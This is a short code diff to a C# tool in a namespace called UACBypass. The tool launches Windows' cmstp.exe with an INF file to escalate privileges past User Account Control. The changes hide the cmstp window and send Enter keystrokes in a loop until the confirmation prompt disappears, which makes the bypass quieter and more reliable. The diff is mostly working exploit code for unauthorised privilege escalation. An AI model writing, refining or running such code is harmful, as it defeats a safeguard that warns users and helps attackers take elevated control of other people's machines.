@@ -109,6 +109,7 @@ namespace UACBypass
 
         [DllImport("user32.dll")] public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
         [DllImport("user32.dll", SetLastError = true)] public static extern bool SetForegroundWindow(IntPtr hWnd);
+        [DllImport("user32.dll")] private static extern bool IsWindowVisible(int hWnd);
 
         public static string BinaryPath = "c:\\windows\\system32\\cmstp.exe";
 
@@ -168,6 +169,7 @@ namespace UACBypass
             ProcessStartInfo startInfo = new ProcessStartInfo(BinaryPath);
             startInfo.Arguments = "/au " + InfFile.ToString();
             startInfo.UseShellExecute = false;
+            startInfo.WindowStyle = ProcessWindowStyle.Hidden;
             Process.Start(startInfo);
 
             //automatically press enter when the cmstp prompting user confirmation.
@@ -178,7 +180,11 @@ namespace UACBypass
                 windowHandle = SetWindowActive("cmstp");
             } while (windowHandle == IntPtr.Zero);
 
-            System.Windows.Forms.SendKeys.SendWait("{ENTER}");
+            do
+            {
+                System.Windows.Forms.SendKeys.SendWait("{ENTER}");
+            }
+            while (IsWindowVisible(windowHandle.ToInt32()));
 
             //kill all cmstp proccesses, otherwise the next privilege escalation may fails.
             foreach (Process p in Process.GetProcessesByName("cmstp")) { p.Kill(); }
